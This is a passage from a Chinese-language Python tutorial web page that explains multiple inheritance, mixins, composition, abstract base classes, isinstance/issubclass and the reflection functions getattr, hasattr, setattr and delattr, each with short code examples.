id="4-9-python多继承【概念】"><a href="#4-9-python多继承【概念】" class="headerlink" title="4.9 python多继承【概念】"></a>4.9 python多继承【概念】</h2><ul><li>继承是面向对象思想的另一个特性。它的存在是为了解决类与类之间代码重复的问题。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不使用继承</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    school = <span class="hljs-string">&#x27;PKU&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex</span>):<br>        self.name = name<br>        self.age = age<br>        self.sex = sex<br>      <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_course</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;学生：<span class="hljs-subst">&#123;self.name&#125;</span>正在选课。。。&#x27;</span>)<br><br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span>:<br>    school = <span class="hljs-string">&#x27;PKU&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex, level</span>):<br>        self.name = name<br>        self.age = age<br>        self.sex = sex<br>        self.level = level<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">score</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;老师：<span class="hljs-subst">&#123;self.name&#125;</span>正在打分。。。&#x27;</span>)<br>    <br>    <br><span class="hljs-comment"># 不使用继承</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PkuPeople</span>:<br>    school = <span class="hljs-string">&#x27;PKU&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex</span>):<br>        self.name = name<br>        self.age = age<br>        self.sex = sex<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">PkuPeople</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_course</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;学生：<span class="hljs-subst">&#123;self.name&#125;</span>正在选课。。。&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-title class_ inherited__">PkuPeople</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, sex, level</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name, age, sex)<br>        self.level = level<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">score</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;老师：<span class="hljs-subst">&#123;self.name&#125;</span>正在打分。。。&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li><p>多继承的优点：同时继承多个父类属性和方法，功能强大。</p></li><li><p>多继承缺点：代码可读性变差。</p></li><li><p>通过类的mro()方法查看多继承的查找顺序。</p></li></ul><h2 id="4-10-深度优先和广度优先【知道就行】"><a href="#4-10-深度优先和广度优先【知道就行】" class="headerlink" title="4.10 深度优先和广度优先【知道就行】"></a>4.10 深度优先和广度优先【知道就行】</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2中区分经典类和新式类：</span><br>- 经典类：没有继承<span class="hljs-built_in">object</span>类的子类，以及该子类的子类子子类。。。<br>- 新式类：继承了<span class="hljs-built_in">object</span>类的子类，以及该子类的子类子子类。。。<br>    <br><span class="hljs-comment"># python3中全部默认继承object，所以都是新式类。</span><br>- <span class="hljs-built_in">object</span>类提供了一些常用内置方法的实现，如用来在打印对象时返回字符串的内置方法__str__<br>    - 通过类的内置属性__bases__可以查看类继承的所有父类<br>    <br>    <br></code></pre></td></tr></table></figure><ul><li><p>继承的菱形结构</p></li><li><p>概念一：经典类和新式类</p></li><li><p>概念二：深度优先和广度优先</p></li></ul><p><img src="/img/python/image-20220508171910552.png" alt="image-20220508171910552"></p><p>如上图，继承关系成菱形</p><h2 id="4-11-Mixin混合机制【有点用】"><a href="#4-11-Mixin混合机制【有点用】" class="headerlink" title="4.11 Mixin混合机制【有点用】"></a>4.11 Mixin混合机制【有点用】</h2><ul><li>允许将某个单一功能封装在独立的类中，然后通过一个类多重继承这些功能类，混合在一起，实现代码的复用和模块化</li><li>单一职责，一个类只关注单一功能</li><li>多重组合，通过多继承将多类混合在一起</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Mixin 类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggingMixin</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">log</span>(<span class="hljs-params">self, message</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Log: <span class="hljs-subst">&#123;message&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailMixin</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_email</span>(<span class="hljs-params">self, subject, body</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Sending email to <span class="hljs-subst">&#123;self.email&#125;</span>: <span class="hljs-subst">&#123;subject&#125;</span>, <span class="hljs-subst">&#123;body&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 具有 LoggingMixin 和 EmailMixin 功能的类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(LoggingMixin, EmailMixin):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, email</span>):<br>        self.username = username<br>        self.email = email<br><br><span class="hljs-comment"># 创建 User 对象并使用 Mixin 功能</span><br>user = User(<span class="hljs-string">&quot;alice&quot;</span>, <span class="hljs-string">&quot;alice@example.com&quot;</span>)<br>user.log(<span class="hljs-string">&quot;User created&quot;</span>)<br>user.send_email(<span class="hljs-string">&quot;Welcome&quot;</span>, <span class="hljs-string">&quot;Welcome to our website!&quot;</span>)<br><br></code></pre></td></tr></table></figure><ul><li>Mixin不是单一功能，只是一种编程思维，通常被定义为混合的类，类名在命名的时候都会在后面加一个Minxin来表示这个类是混合类</li></ul><p>Minx使用规范</p><ul><li>首先它必须表示某一种功能，而不是某个物品，python 对于mixin类的命名方式一般以 Mixin, able, ible 为后缀。</li><li>其次它必须责任单一，如果有多个功能，那就写多个Mixin类，一个类可以继承多个Mixin。</li><li>它不依赖于子类的实现；子类即便没有继承这个Mixin类，也照样可以工作，就是缺少了某个功能。</li><li>通常Mixin的类放在子类括号内的右边（表示非核心功能）</li></ul><h2 id="4-12-派生和组合"><a href="#4-12-派生和组合" class="headerlink" title="4.12 派生和组合"></a>4.12 派生和组合</h2><p>派生：在使用父类原有的方法的基础上，增加新的内容（用super( )方法重写父类方法）</p><p>子类可以原封不动的使用父类的属性&#x2F;方法，也可以重写父类的属性&#x2F;方法，还可以在使用父类的属性&#x2F;方法的同时，添加新的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 方式1：使用只用父类的方法，需要传self参数。</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">People</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, gender</span>):<br>        self.name = name<br>        self.age = age<br>        self.gender = gender<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">People</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, gender, code</span>):<br>        People.__init__(self, name, age, gender)<br>        self.code = code<br><br><br>stu = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;男&quot;</span>, <span class="hljs-number">10111</span>)<br><span class="hljs-built_in">print</span>(stu.__dict__)<br><br><br><span class="hljs-comment"># 方式2：使用super(), 按照MOR列表的顺序往下找</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">People</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, gender, code</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name, age, gender)  <span class="hljs-comment"># 用super()重写了父类属性</span><br>        self.code = code<br></code></pre></td></tr></table></figure><ul><li>组合：对象的某个属性，是另一个类的实例化对象</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">name, age</span>):<br>        self.name = name<br>        self.age = age<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Coursr</span>:<br>    <span class="hljs-keyword">pass</span><br><br>stu = Student(<span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-number">18</span>)<br>course_obj = Course()<br>stu.course = course_obj<br><br><span class="hljs-comment"># 继承是一种“是”的关系，比如老师是人、学生是人。</span><br><span class="hljs-comment"># 组合则是一种“有”的关系，比如老师有生日，老师有多门课程。</span><br></code></pre></td></tr></table></figure><h2 id="4-13-限制子类必须实现的方法【重点】【抽象概念】–设计模式的一种"><a href="#4-13-限制子类必须实现的方法【重点】【抽象概念】–设计模式的一种" class="headerlink" title="4.13 限制子类必须实现的方法【重点】【抽象概念】–设计模式的一种"></a>4.13 限制子类必须实现的方法【重点】【抽象概念】–设计模式的一种</h2><p>在父类中定义的方法，需要子类必须实现，此时就有两种限制方法</p><p>方式1：使用模块abc，（即抽象类abstract class的缩写）</p><p>就是加ab的装饰器的方法，然后你在继承的时候，必须去定义这个方法，不然实例化的时候就会出错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> abc<br><span class="hljs-keyword">import</span> abc<br><br><span class="hljs-comment"># 指定metaclass属性将类设置为抽象类，抽象类本身只是用来约束子类的，抽象类本身不能被实例化</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>(metaclass=abc.ABCMeta):<br><span class="hljs-meta">    @abc.abstractmethod </span><span class="hljs-comment"># 该装饰器限制子类必须定义有一个名为talk的方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">talk</span>(<span class="hljs-params">self</span>): <span class="hljs-comment"># 抽象方法中无需实现具体的功能</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-title class_ inherited__">Animal</span>):<span class="hljs-comment"># 但凡继承Animal的子类都必须遵循Animal规定的标准</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">talk</span>(<span class="hljs-params">self</span>):<span class="hljs-comment"># 必须定义talk方法</span><br>        <span class="hljs-keyword">pass</span><br><br>cat=Cat() <span class="hljs-comment"># 若子类中没有一个定义talk的方法则会抛出异常TypeError，无法实例化</span><br></code></pre></td></tr></table></figure><p>方式2：使用 <code>NotImplementedError</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">talk</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;该方法必须被实现&quot;</span>)<br>        <br><span class="hljs-comment"># 如果子类没有实现talk方法，子类调用talk时候使用父类的talk,此时直接抛出异常 NotImplementedError</span><br></code></pre></td></tr></table></figure><h2 id="4-14-isinstance"><a href="#4-14-isinstance" class="headerlink" title="4.14 isinstance"></a>4.14 isinstance</h2><p>当我们需要获取一个对象的类型是，可以使用&#96;type()</p><p>当我们需要判断一个对象是否是指定类型时可以使用<code>isinstance</code>函数快速判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">People</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = name<br><br><br>p = People(<span class="hljs-string">&quot;jack&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(p, People))<span class="hljs-comment"># 判断p 是否是People类型</span><br><br>a = <span class="hljs-number">10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">int</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(a, (<span class="hljs-built_in">str</span>, <span class="hljs-built_in">int</span>)))<span class="hljs-comment"># 可以是多个备选类型，以元组的形式做第二个参数</span><br>除此之外，还有一个函数可以判断类与类之间的父子关系，`<span class="hljs-built_in">issubclass</span>`<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = name<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">People</span>(<span class="hljs-title class_ inherited__">Animal</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">issubclass</span>(People, Animal))               <span class="hljs-comment"># True</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">issubclass</span>(Animal, People))               <span class="hljs-comment"># False</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">issubclass</span>(People, (<span class="hljs-built_in">list</span>, Animal)))       <span class="hljs-comment"># True</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">issubclass</span>(People, People))               <span class="hljs-comment"># True</span><br></code></pre></td></tr></table></figure><h2 id="4-15-反射机制【重点】"><a href="#4-15-反射机制【重点】" class="headerlink" title="4.15 反射机制【重点】"></a>4.15 反射机制【重点】</h2><ul><li>首先： 反射机制是什么？反射机制<br>首先，python是一门动态语言，python的反射机制就是指，可以在程序运行的时候获取程序的属性方法，而不需要在编码时明确知道这些对象、方法名、或属性名的具体信息，反射使得你可以在程序运行时动态地获取、操作和探索对象的属性和方法。python的反射机制核心4点：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">hasattr</span>(<span class="hljs-built_in">object</span>, <span class="hljs-string">&quot;x&quot;</span>)  <span class="hljs-comment"># 判断对象是否有这个属性，如果有 就返回布尔值True 或 False</span><br><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">object</span>, name, default=<span class="hljs-literal">None</span>)  <span class="hljs-comment"># 获取一个对象的name属性，如果name属性不存在的话，返回None</span><br><span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">object</span>, <span class="hljs-string">&#x27;x属性名&#x27;</span>, <span class="hljs-string">&#x27;y属性名&#x27;</span>)  <span class="hljs-comment"># 更新对象x属性的值，就是object.x = &#x27;y&#x27; 如果x属性不存在，那就新增一个y属性</span><br><span class="hljs-built_in">delattr</span>(<span class="hljs-built_in">object</span>, <span class="hljs-string">&#x27;y属性名&#x27;</span>)  <span class="hljs-comment"># 删除对象的一个属性y，如果属性y不存在，就会报错</span><br><br><br></code></pre></td></tr></table></figure><ul><li>1、getattr( object, name,default&#x3D;None):</li><li>2、hasattr():</li><li>3、setattr():</li><li>4、delattr():</li><li>5、dir(): 这个常用，这个就时获取对象所有属性</li><li>6、exec():和eval():函数</li></ul><p>python中使用反射非常方便，仅需要使用4个内置函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 比如判断用户输入的一个字符串是不是一个对象的属性, 使用if-elif-else 判断较为繁琐。</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Ftp</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>ftp = Ftp()<br>cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入指令：&#x27;</span>).strip()<br><span class="hljs-keyword">if</span> cmd == <span class="hljs-string">&#x27;get&#x27;</span>:<br>    ftp.get()<br><span class="hljs-keyword">elif</span> cmd == <span class="hljs-string">&#x27;set&#x27;</span>:<br>    ftp.<span class="hljs-built_in">set</span>()<br><span class="hljs-keyword">elif</span> cmd == <span class="hljs-string">&quot;delete&quot;</span>:<br>    ftp.delete()<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;指令不存在&#x27;</span>)<br>    <br><span class="hljs-built_in">hasattr</span>(obj, <span class="hljs-string">&#x27;x&#x27;</span>)                  <span class="hljs-comment"># 判断对象是否有一个属性，返回布尔值</span><br><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">object</span>, name, default=<span class="hljs-literal">None</span>)  <span class="hljs-comment"># 获取一个对象的name属性，如果name属性不存在的返回None</span><br><span class="hljs-built_in">setattr</span>(x, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>)              <span class="hljs-comment"># 更新对象y属性的值, 等价于 x.y = &#x27;v&#x27;，当y不存在的新增</span><br><span class="hljs-built_in">delattr</span>(x, <span class="hljs-string">&#x27;y&#x27;</span>)                  <span class="hljs-comment"># 删除对象的一个属性， 等价于 del x.y   属性y不存在则报错</span><br><span class="hljs-comment"># 上面使用条件判断的例子使用反射可以简化如下</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Ftp</span>:<br>    ...<br><br>ftp = Ftp()<br>cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入指令：&#x27;</span>).strip()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(ftp, cmd):<br>    <span class="hljs-built_in">getattr</span>(ftp, cmd)()<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;指令不存在&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>反射类的属性</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>(<span class="hljs-title class_ inherited__">object</span>):<br> <br>    staticField = <span class="hljs-string">&quot;HAHA&quot;</span><br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.name = <span class="hljs-string">&#x27;jack&#x27;</span><br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;func&#x27;</span><br> <br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bar</span>():<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;bar&#x27;</span><br> <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">getattr</span>(Foo, <span class="hljs-string">&#x27;staticField&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">getattr</span>(Foo, <span class="hljs-string">&#x27;func&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">getattr</span>(Foo, <span class="hljs-string">&#x27;bar&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>反射当前模块成员</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;s1&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s2</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;s2&#x27;</span>)<br><br><br>this_module = sys.modules[__name__]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hasattr</span>(this_module, <span class="hljs-string">&#x27;s1&#x27;</span>))<br><span class="hljs-built_in">getattr</span>(this_module, <span class="hljs-string">&#x27;s2&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>补充：反射的底层原理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(obj))<br><span class="hljs-built_in">print</span>(obj.__dict__[<span class="hljs-built_in">dir</span>(obj)[index]])<br></code></pre></td></tr></table></figure><p>作用呢？</p><p>动态调用和访问对象的属性，getattr() setattr() hasattr()这些都可以随时修改和获取对象的属性</p><p>动态获取token</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiClient</span>:<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>    self.token = <span class="hljs-literal">None</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self, username, password</span>):<br>    <span class="hljs-comment"># 假设这里调用登录接口，获取返回的 token，并将其存储到 self.token 中</span><br>    response = self.send_request(<span class="hljs-string">&#x27;/login&#x27;</span>, &#123;<span class="hljs-string">&#x27;username&#x27;</span>: username, <span class="hljs-string">&#x27;password&#x27;</span>: password&#125;)<br>    self.token = response[<span class="hljs-string">&#x27;token&#x27;</span>]<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">self, endpoint, data</span>):<br>    <span class="hljs-comment"># 发送接口请求的逻辑，返回响应数据</span><br>    <span class="hljs-keyword">pass</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">request_with_token</span>(<span class="hljs-params">self, endpoint, data=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> self.token:<br>      headers = &#123;<span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">f&#x27;Bearer <span class="hljs-subst">&#123;self.token&#125;</span>&#x27;</span>&#125;<br>    <span class="hljs-keyword">else</span>:<br>      headers = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> self.send_request(endpoint, data, headers)<br><br><br><span class="hljs-comment"># 在测试中使用反射获取 token 并进行接口请求</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_api</span>():<br>  client = ApiClient()<br>  client.login(<span class="hljs-string">&#x27;your_username&#x27;</span>, <span class="hljs-string">&#x27;your_password&#x27;</span>)<br><br>  <span class="hljs-comment"># 使用反射获取 token</span><br>  token = <span class="hljs-built_in">getattr</span>(client, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-literal">None</span>)<br>  <span class="hljs-keyword">assert</span> token <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;Token not obtained&quot;</span><br><br>  <span class="hljs-comment"># 使用 token 发送其他接口请求</span><br>  response = client.request_with_token(<span class="hljs-string">&#x27;/some_endpoint&#x27;</span>, &#123;<span class="hljs-string">&#x27;param&#x27;</span>: <span class="hljs-string">&#x27;value&#x27;</span>&#125;)<br>  <span class="hljs-keyword">assert</span> response[<span class="hljs-string">&#x27;status&#x27;</span>] == <span 